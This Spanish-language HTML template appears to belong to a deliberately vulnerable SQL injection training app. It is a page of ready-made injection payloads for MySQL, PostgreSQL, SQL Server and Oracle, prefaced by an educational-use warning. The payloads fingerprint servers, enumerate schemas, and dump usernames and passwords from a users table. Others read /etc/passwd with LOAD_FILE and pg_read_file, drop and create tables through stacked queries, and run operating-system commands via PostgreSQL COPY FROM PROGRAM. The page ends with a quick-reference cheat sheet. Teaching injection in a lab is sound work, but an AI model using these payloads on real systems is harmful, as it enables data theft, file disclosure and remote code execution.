{% extends "base.html" %}

{% block title %}SQL Injection Demo - Ejemplos{% endblock %}

{% block content %}
<div class="row">
    <div class="col-lg-10 mx-auto">
        <div class="card shadow">
            <div class="card-header bg-info text-white">
                <h3 class="mb-0">
                    <i class="fas fa-graduation-cap"></i> Ejemplos de SQL Injection
                </h3>
            </div>
            <div class="card-body">
                <div class="alert alert-warning">
                    <i class="fas fa-exclamation-triangle"></i>
                    <strong>⚠️ ADVERTENCIA:</strong> Estos ejemplos son para fines educativos únicamente. 
                    No usar en sistemas de producción o con datos reales.
                </div>

                <!-- MySQL Examples -->
                <div class="mb-4">
                    <h4 class="text-primary">
                        <i class="fas fa-database"></i> MySQL
                    </h4>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="card border-primary">
                                <div class="card-header bg-primary text-white">
                                    <h6 class="mb-0">Información del Sistema</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 1,@@version,DATABASE(),USER(),NOW() --</code>
                                    <br><small class="text-muted">Obtener información del servidor</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-danger">
                                <div class="card-header bg-danger text-white">
                                    <h6 class="mb-0">Enumeración de Tablas</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,'mysql_tables',NOW() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() --</code>
                                    <br><small class="text-muted">Listar tablas de la BD</small>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row mt-2">
                        <div class="col-md-6">
                            <div class="card border-warning">
                                <div class="card-header bg-warning text-dark">
                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,'users_columns',NOW() FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' --</code>
                                    <br><small class="text-muted">Estructura de tabla users</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-info">
                                <div class="card-header bg-info text-white">
                                    <h6 class="mb-0">Extracción de Datos</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT id,username,password,email,created_at FROM users --</code>
                                    <br><small class="text-muted">Obtener datos de usuarios</small>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                    <div class="row mt-2">
                        <div class="col-md-12">
                            <div class="card border-warning">
                                <div class="card-header bg-warning text-dark">
                                    <h6 class="mb-0">📁 Lectura de Archivos del Sistema - LOAD_FILE()</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 --</code>
                                    <br><small class="text-muted"><strong>🔒 CRÍTICO:</strong> Lee archivos del sistema sin restricciones de casting.</small>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- PostgreSQL Examples -->
                <div class="mb-4">
                    <h4 class="text-success">
                        <i class="fas fa-database"></i> PostgreSQL
                    </h4>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="card border-success">
                                <div class="card-header bg-success text-white">
                                    <h6 class="mb-0">Información del Sistema</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 1,version(),'postgresql',current_user,NOW() --</code>
                                    <br><small class="text-muted">Información del servidor PostgreSQL</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-danger">
                                <div class="card-header bg-danger text-white">
                                    <h6 class="mb-0">Enumeración de Tablas (Stacked)</h6>
                                </div>
                                <div class="card-body">
                                    <code>'; DROP TABLE IF EXISTS temp_tables; CREATE TABLE temp_tables AS SELECT tablename FROM pg_tables WHERE schemaname='public'; --</code>
                                    <br><small class="text-muted">Crear tabla temporal con metadatos</small>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row mt-2">
                        <div class="col-md-6">
                            <div class="card border-warning">
                                <div class="card-header bg-warning text-dark">
                                    <h6 class="mb-0">Consulta de Tablas Temporales</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 1,tablename,'public','pg_tables',NOW()::text FROM temp_tables --</code>
                                    <br><small class="text-muted">Acceder a tabla temporal</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-info">
                                <div class="card-header bg-info text-white">
                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 999,column_name,data_type,'users_cols',CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users' --</code>
                                    <br><small class="text-muted">Estructura de columnas</small>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row mt-2">
                        <div class="col-md-12">
                            <div class="card border-danger">
                                <div class="card-header bg-danger text-white">
                                    <h6 class="mb-0">🚨 Remote Code Execution (RCE) - COPY FROM PROGRAM</h6>
                                </div>
                                <div class="card-body">
                                    <code>'; DROP TABLE IF EXISTS temp_whoami; CREATE TEMP TABLE temp_whoami (content TEXT); COPY temp_whoami FROM PROGRAM 'whoami'; SELECT * FROM temp_whoami; --</code>
                                    <br><small class="text-muted"><strong>⚠️ PELIGROSO:</strong> Ejecuta comandos del sistema operativo. Resultado: <strong>postgres</strong></small>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                    <div class="row mt-2">
                        <div class="col-md-12">
                            <div class="card border-warning">
                                <div class="card-header bg-warning text-dark">
                                    <h6 class="mb-0">📁 Lectura de Archivos del Sistema - pg_read_file()</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT '999',pg_read_file('/etc/passwd'),'test','test','2025-01-01 00:00:00'::timestamp --</code>
                                    <br><small class="text-muted"><strong>🔒 CRÍTICO:</strong> Lee archivos del sistema. Requiere casting explícito de tipos.</small>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- SQL Server Examples -->
                <div class="mb-4">
                    <h4 class="text-warning">
                        <i class="fas fa-database"></i> SQL Server
                    </h4>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="card border-warning">
                                <div class="card-header bg-warning text-dark">
                                    <h6 class="mb-0">Información del Sistema</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 1,@@VERSION,DB_NAME(),SYSTEM_USER,GETDATE() --</code>
                                    <br><small class="text-muted">Información del servidor SQL Server</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-danger">
                                <div class="card-header bg-danger text-white">
                                    <h6 class="mb-0">Enumeración de Tablas</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,'sqlserver_tables',GETDATE() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' --</code>
                                    <br><small class="text-muted">Listar tablas base</small>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row mt-2">
                        <div class="col-md-6">
                            <div class="card border-warning">
                                <div class="card-header bg-warning text-dark">
                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,'users_columns',GETDATE() FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' --</code>
                                    <br><small class="text-muted">Estructura de columnas</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-info">
                                <div class="card-header bg-info text-white">
                                    <h6 class="mb-0">Extracción de Datos</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT id,username,password,email,created_at FROM users --</code>
                                    <br><small class="text-muted">Datos de usuarios</small>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Oracle Examples -->
                <div class="mb-4">
                    <h4 class="text-danger">
                        <i class="fas fa-database"></i> Oracle
                    </h4>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="card border-danger">
                                <div class="card-header bg-danger text-white">
                                    <h6 class="mb-0">Información del Sistema</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 999,USER,'oracle_system','discovery',SYSDATE FROM DUAL --</code>
                                    <br><small class="text-muted">Usuario actual del sistema</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-danger">
                                <div class="card-header bg-danger text-white">
                                    <h6 class="mb-0">Enumeración de Tablas</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 999,TABLE_NAME,'USER_TABLES','oracle_enum',SYSDATE FROM USER_TABLES --</code>
                                    <br><small class="text-muted">Tablas del usuario</small>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row mt-2">
                        <div class="col-md-6">
                            <div class="card border-warning">
                                <div class="card-header bg-warning text-dark">
                                    <h6 class="mb-0">Enumeración de Sinónimos</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 999,SYNONYM_NAME,TABLE_NAME,'oracle_synonyms',SYSDATE FROM USER_SYNONYMS --</code>
                                    <br><small class="text-muted">Mapeo de sinónimos a tablas</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-info">
                                <div class="card-header bg-info text-white">
                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                </div>
                                <div class="card-body">
                                    <code>' UNION SELECT 999,COLUMN_NAME,DATA_TYPE,'sys_products_cols',SYSDATE FROM ALL_TAB_COLUMNS WHERE OWNER='SYS' AND TABLE_NAME='PRODUCTS' --</code>
                                    <br><small class="text-muted">Columnas de tablas del sistema</small>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Payloads de Referencia Rápida -->
                <div class="mb-4">
                    <h4 class="text-dark">
                        <i class="fas fa-rocket"></i> Payloads de Referencia Rápida
                    </h4>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="card border-dark">
                                <div class="card-header bg-dark text-white">
                                    <h6 class="mb-0">Información del Sistema (Multi-DB)</h6>
                                </div>
                                <div class="card-body">
                                    <code>-- MySQL/SQL Server<br>' UNION SELECT 1,@@version,DATABASE(),USER(),NOW() --<br><br>-- PostgreSQL<br>' UNION SELECT 1,version(),'postgresql',current_user,NOW() --<br><br>-- Oracle<br>' UNION SELECT 999,USER,'oracle',USER,SYSDATE FROM DUAL --</code>
                                    <br><small class="text-muted">Adaptado según el motor de BD</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-dark">
                                <div class="card-header bg-dark text-white">
                                    <h6 class="mb-0">Enumeración de Tablas</h6>
                                </div>
                                <div class="card-body">
                                    <code>-- MySQL/SQL Server<br>' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,'enum',NOW() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() --<br><br>-- PostgreSQL (Stacked)<br>'; CREATE TABLE temp_enum AS SELECT tablename FROM pg_tables WHERE schemaname='public'; --<br><br>-- Oracle (Sinónimos)<br>' UNION SELECT 999,SYNONYM_NAME,TABLE_NAME,'synonyms',SYSDATE FROM USER_SYNONYMS --</code>
                                    <br><small class="text-muted">Técnicas específicas por motor</small>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row mt-2">
                        <div class="col-md-6">
                            <div class="card border-dark">
                                <div class="card-header bg-dark text-white">
                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                </div>
                                <div class="card-body">
                                    <code>-- MySQL/SQL Server<br>' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,'columns',NOW() FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='tabla' --<br><br>-- PostgreSQL<br>' UNION SELECT 999,column_name,data_type,'columns',CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='tabla' --<br><br>-- Oracle<br>' UNION SELECT 999,COLUMN_NAME,DATA_TYPE,'columns',SYSDATE FROM ALL_TAB_COLUMNS WHERE OWNER='ESQUEMA' AND TABLE_NAME='TABLA' --</code>
                                    <br><small class="text-muted">Mapeo de estructura de tablas</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card border-dark">
                                <div class="card-header bg-dark text-white">
                                    <h6 class="mb-0">Consideraciones Especiales</h6>
                                </div>
                                <div class="card-body">
                                    <code>-- Oracle: Estrictez de tipos crítica<br>-- PostgreSQL: Casting explícito (::text)<br>-- Oracle: Sinónimos ocultan ubicación real<br>-- PostgreSQL: Stacked queries habilitadas<br>-- General: Validar número de columnas primero</code>
                                    <br><small class="text-muted">Notas importantes por motor</small>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %} 
